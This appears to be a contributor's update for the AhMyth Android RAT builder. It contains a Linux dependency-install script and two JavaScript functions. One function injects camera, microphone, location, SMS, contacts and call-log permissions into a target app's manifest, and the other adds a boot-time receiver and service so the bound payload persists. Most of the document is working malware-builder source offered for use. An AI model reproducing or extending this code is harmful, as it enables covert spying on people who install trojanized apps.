## New Autoinstall code.
> Thank you to [karma0x309](https://github.com/karma0x309) for the base of this code
```bash
#!/bin/sh

# Check package manager
if [ -x "$(command -v apt-get)" ]; then
    PACKAGE_MANAGER="apt-get"
elif [ -x "$(command -v pacman)" ]; then
    PACKAGE_MANAGER="pacman"
else
    echo -e "Unsupported package manager.\nThis script currently supports APT and Pacman-based systems."
    exit 1
fi

java_install() {
    echo -e "\nInstalling Java 11...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y openjdk-11-jdk
        update-java-alternatives -s java-11-openjdk-amd64
        update-alternatives --set java /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/java
        update-alternatives --set javac /usr/lib/jvm/java-11-openjdk-amd64/bin/javac
        update-alternatives --set javaws /usr/lib/jvm/java-11-openjdk-amd64/jre/bin/javaws
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy jdk11-openjdk
    fi
    echo -e "\nJava 11 has been installed successfully."
    sleep 2
    clear
}

nodejs_install() {
    echo -e "\nInstalling Node.js...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y nodejs
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy nodejs
    fi
    echo -e "\nNode.js has been installed successfully."
    sleep 2
    clear
}

npm_install() {
    echo -e "\nInstalling npm...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y npm
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy npm
    fi
    echo -e "\nnpm has been installed successfully."
    sleep 2
    clear
}

git_install() {
    echo -e "\nInstalling Git...\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y git
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy git
    fi
    echo -e "\nGit has been installed successfully."
    sleep 2
    clear
}

dependencies_install() {
    echo -e "\nInstalling Electron v11.0.0...\n"
    npm i -g electron@11.0.0
    echo -e "\nDone."
    sleep 2
    clear
}

# Check if user is root
if [ "$(id -u)" != "0" ]; then
    echo -e "This script must be run as root!" 1>&2
    exit 1
fi

# Update and upgrade
echo -e "Updating and upgrading...\n"
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    apt-get update && apt-get upgrade -y
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    pacman -Syu --noconfirm
fi
echo -e "\nUpdate and Upgrade done."
sleep 2
clear

# Check if Java 11 is installed
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    if [ -z "$(dpkg -l | grep openjdk-11)" ]; then
        echo -e "Java 11 is not installed!"
        java_install
    fi
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    if ! pacman -Qi jdk11-openjdk >/dev/null 2>&1; then
        echo -e "Java 11 is not installed!"
        java_install
    fi
fi

# Check if nodejs is installed
if [ -z "$(command -v node)" ]; then
    echo -e "Node.js is not installed!" 1>&2
    nodejs_install
fi

# Check if npm is installed
if [ -z "$(command -v npm)" ]; then
    echo -e "npm is not installed!" 1>&2
    npm_install
fi

# Check if git is installed
if [ -z "$(command -v git)" ]; then
    echo -e "Git is not installed!" 1>&2
    git_install
fi

# Check if electron v11 is installed
if [ -z "$(command -v electron)" ]; then
    echo -e "electron has not been installed by npm!\n" 1>&2
    dependencies_install
fi
```
#
## Updated `"copyPermissions"` function w/ updated permissions checkbox code.
```js
  $appCtrl.copyPermissions = (data, callback) => {
    var checkBoxofCamera = document.getElementById("Permissions1");
    var checkBoxofStorage = document.getElementById("Permissions2");
    var checkBoxofMic = document.getElementById("Permissions3");
    var checkBoxofLocation = document.getElementById("Permissions4");
    var checkBoxofContacts = document.getElementById("Permissions5");
    var checkBoxofSms = document.getElementById("Permissions6");
    var checkBoxofCallsLogs = document.getElementById("Permissions7");

    // default permissions for the payload
    const permissions = CONSTANTS.permissions;

    // Create an array to store the selected permissions
    var selectedPermissions = [];

    // Check each checkbox and add the corresponding permission to the selectedPermissions array
    if (checkBoxofCamera.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
    }
    if (checkBoxofStorage.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
    }
    if (checkBoxofMic.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
    }
    if (checkBoxofLocation.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
    }
    if (checkBoxofContacts.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
    }
    if (checkBoxofSms.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
    }
    if (checkBoxofCallsLogs.checked) {
      selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
    }

    // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
    if (
      checkBoxofCamera.checked &&
      checkBoxofStorage.checked &&
      checkBoxofMic.checked &&
      checkBoxofLocation.checked &&
      checkBoxofContacts.checked &&
      checkBoxofSms.checked &&
      checkBoxofCallsLogs.checked
    ) {
      selectedPermissions = permissions;
    }

    // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
    if (
      !checkBoxofCamera.checked &&
      !checkBoxofStorage.checked &&
      !checkBoxofMic.checked &&
      !checkBoxofLocation.checked &&
      !checkBoxofContacts.checked &&
      !checkBoxofSms.checked &&
      !checkBoxofCallsLogs.checked
    ) {
      selectedPermissions = permissions;
    }

    delayedLog('[★] Parsing the Android Manifest File...');

    // Convert data to a string if it's not already a string
    if (typeof data !== 'string') {
      data = data.toString();
    }

    xml2js.parseString(data, {
      explicitArray: false
    }, (err, result) => {
      if (err) {
        delayedLog(err);
        callback(err);
        return;
      }

      const manifestObj = result.manifest;

      // store existing permissions
      const existingPermissions = new Set();

      // Check if permissions already exist in the manifest
      if (manifestObj['uses-permission']) {
        if (!Array.isArray(manifestObj['uses-permission'])) {
          manifestObj['uses-permission'] = [manifestObj['uses-permission']];
        }
        manifestObj['uses-permission'].forEach((permission) => {
          existingPermissions.add(permission.$['android:name']);
        });
      } else {
        manifestObj['uses-permission'] = [];
      }

      // Check if features already exist in the manifest
      if (manifestObj['uses-feature']) {
        if (!Array.isArray(manifestObj['uses-feature'])) {
          manifestObj['uses-feature'] = [manifestObj['uses-feature']];
        }
        manifestObj['uses-feature'].forEach((feature) => {
          existingPermissions.add(feature.$['android:name']);
        });
      } else {
        manifestObj['uses-feature'] = [];
      }

      // Filter selected permissions to exclude duplicates
      const filteredPermissions = selectedPermissions.filter((permission) => {
        return !existingPermissions.has(permission);
      });

      delayedLog('[★] Modifying the Android Manifest File...');

      // Add new permissions and features based on filteredPermissions
      filteredPermissions.forEach(permission => {
        if (permission === 'android.hardware.camera') {
          manifestObj['uses-feature'].push({
            $: {
              'android:name': 'android.hardware.camera'
            },
            _: '' // Add empty string as element text
          });
        }

        if (permission === 'android.hardware.camera.autofocus') {
          manifestObj['uses-feature'].push({
            $: {
              'android:name': 'android.hardware.camera.autofocus'
            },
            _: '' // Add empty string as element text
          });
        }

        if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
          manifestObj['uses-permission'].push({
            $: {
              'android:name': permission
            },
            _: '' // Add empty string as element text
          });
        }
      });

      const builder = new xml2js.Builder({
        renderOpts: {
          pretty: true,
          indent: '    '
        },
        headless: true
      });
      const updatedData = builder.buildObject(result);

      callback(null,
        updatedData);
    });
  };
```
#
## Updated `BindOnBoot` function
```js
$appCtrl.BindOnBoot = (apkFolder) => {
    
    delayedLog('[★] Reading the Android Manifest File...')
    fs.readFile(manifestFilePath, 'utf8', (err, data) => {
        if (err) {
            delayedLog('[x] Unable to Read the Android Manifest File!', CONSTANTS.logStatus.FAIL);
            return;
        }

        $appCtrl.copyPermissions(data, (err, updatedData) => {
            if (err) {
                delayedLog(err);
                return;
            }

            const parser = new xml2js.Parser({
                explicitArray: false
            });
            parser.parseString(updatedData, (parseErr, result) => {
                if (parseErr) {
                    console.error('Error parsing the Android manifest XML:', parseErr);
                    return;
                }

                // Use the service and receiver from Constants.js
                const receiver = CONSTANTS.ahmythReceiver;
                const service = CONSTANTS.ahmythService;

                // Construct the receiver and service tag
                const receiverTag = {
                    $: {
                        'android:enabled': 'true',
                        'android:exported': 'true',
                        'android:name': receiver,
                    },
                    'intent-filter': {
                        action: {
                            $: {
                                'android:name': 'android.intent.action.BOOT_COMPLETED',
                            },
                        },
                    },
                };

                const serviceTag = {
                    $: {
                        'android:enabled': 'true',
                        'android:exported': 'false',
                        'android:name': service,
                    },
                };

                // Add the receiver and service tags to the application node
                if (!result.manifest.application.receiver) {
                    result.manifest.application.receiver = [];
                }

                result.manifest.application.receiver.push(receiverTag);

                if (!result.manifest.application.service) {
                    result.manifest.application.service = [];
                }

                result.manifest.application.service.push(serviceTag);

                const builder = new xml2js.Builder();

                // Modify the parsed object by finding and updating the closing application tag
                const closingAppTag = '</application>';
                const modifiedClosingAppTag = '\n  </application>';
                const xmlString = builder.buildObject(result);

                const modifiedXml = xmlString.replace(closingAppTag, modifiedClosingAppTag);

                // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
                const closingManifestTag = '</manifest>';
                const finalModifiedXml = modifiedXml.replace(closingManifestTag, '</manifest>');

                fs.writeFile(manifestFilePath, finalModifiedXml, 'utf8', (error) => {
                    if (error) {
                        delayedLog(error);
                        return;
                    }
                });
            });
        });
    });
};
```
